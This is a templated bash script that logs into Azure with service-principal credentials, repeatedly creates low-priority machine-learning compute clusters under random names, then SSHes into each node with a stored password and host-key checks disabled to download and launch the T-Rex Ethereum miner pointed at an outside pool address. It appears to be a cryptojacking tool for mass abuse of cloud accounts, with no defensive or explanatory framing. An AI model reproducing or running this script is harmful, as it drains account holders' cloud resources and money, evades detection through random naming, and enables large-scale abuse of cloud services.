#!/bin/bash
loginString=(loginString_)
worker="worker_"
wallet="wallet_"
username="username_"
password="password_"
location="location_"
group="group_"
limit=limit_
size="size_"
sizeCore=sizeCore_

#######################################################################################################
let total=(limit/sizeCore)-1
echo | sudo add-apt-repository ppa:micahflee/ppa
echo Y | sudo apt install sshpass
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az extension add -n ml -y
az login --service-principal --username ${loginString[0]} --password ${loginString[1]} --tenant ${loginString[2]};

while [ 1 ]
do
    az ml compute delete -n check -g $group -w ws_$location -y
    az ml compute create -n check -g $group -w ws_$location --size $size --type AmlCompute --tier low_priority --min-instances 1 --max-instances 1 --admin-username $username --admin-password $password -p true
    state=$(az ml compute list -g $group -w ws_$location --query '[0].provisioning_state' -o tsv)
    echo $state
    if [ "$state" = "Succeeded" ]
    then
        for (( i=1; i<=$total; i++ ))
        do
            count=$[$RANDOM % 8 + 3]
            name=$(head /dev/urandom | tr -dc a-z | head -c$count)
            tmux new-session -d -s $i
            tmux send -t $i "az ml compute create -n $name -g $group -w ws_$location --size $size --type AmlCompute --tier low_priority --min-instances 1 --max-instances 1 --admin-username $username --admin-password $password -p true" ENTER
            echo "$i - $name"
        done
        break
    fi
    sleep 10m
done

while [ 1 ]
do
    list=$(az ml compute list -g $group -w ws_$location --query '[].name' -o tsv)
    for name in $list
    do
        printf "\n ==> $name\n"
        ip=$(az ml compute list-nodes -n $name -g $group -w ws_$location --query "[0].public_ip_address" -o tsv)
        if [[ "$ip" != "" ]]
        then
            port=$(az ml compute list-nodes -n $name -g $group -w ws_$location --query "[0].port" -o tsv)
            session=$(sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ip -p $port "tmux ls")
            echo $session
            if [[ "$session" != *"1 windows"* ]]
            then
                echo "start ssh"
                sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$ip -p $port "wget https://github.com/trexminer/T-Rex/releases/download/0.25.9/t-rex-0.25.9-linux.tar.gz; tar -xf t-rex-0.25.9-linux.tar.gz; tmux new-session -d -s 1; tmux send -t 1 \"sudo ./t-rex -a ethash -o http://45.117.164.125:5000\" ENTER"
            else
                echo "dang chay"
            fi
        else
            echo "khong co node"
        fi
    done
    sleep 60
done

